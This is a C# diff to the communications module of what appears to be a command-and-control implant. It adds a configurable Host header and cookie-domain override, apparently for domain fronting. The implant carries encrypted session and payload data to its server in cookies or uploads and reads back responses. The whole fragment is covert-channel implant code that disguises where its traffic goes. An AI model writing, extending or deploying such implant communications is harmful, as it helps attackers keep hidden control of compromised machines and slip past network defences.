@@ -55,7 +55,9 @@ namespace ImplantSide.Classes.Comms
                     wc.Proxy = HttpWebRequest.GetSystemWebProxy();
                 else 
                     wc.Proxy = _config.WebProxy;
-            cookies.Add(new Cookie($"{_config.SessionCookieName}", $"{encryptedSessionPayload}") { Domain = _config.URL.Host });
+            wc.Headers.Add("Host", _config.HostHeader);
+
+            cookies.Add(new Cookie($"{_config.SessionCookieName}", $"{encryptedSessionPayload}") { Domain = (!String.IsNullOrWhiteSpace(_config.HostHeader)) ? _config.HostHeader.Split(':')[0] : _config.URL.Host });
 
             string encPayload = null;
             if (null != payload && payload.Count > 0)
@@ -93,8 +95,16 @@ namespace ImplantSide.Classes.Comms
                         response = wc.UploadString(BuildServerURI(), encPayload);
                     else
                     {
+                        if (wc.Headers.AllKeys.Contains("Host"))
+                        {
+                            if (wc.Headers["Host"] != _config.HostHeader)
+                                wc.Headers["Host"] = _config.HostHeader;
+                        }
+                        else
+                            wc.Headers.Add("Host", _config.HostHeader);
                         if (payload != null && payload.Count() > 0)
-                            cookies.Add(new Cookie($"{_config.PayloadCookieName}", $"{encPayload}") { Domain = _config.URL.Host });
+                            cookies.Add(new Cookie($"{_config.PayloadCookieName}", $"{encPayload}") { Domain = (!String.IsNullOrWhiteSpace(_config.HostHeader)) ? _config.HostHeader.Split(':')[0] : _config.URL.Host });
+
                         
                         response = wc.DownloadString(BuildServerURI());
                     }
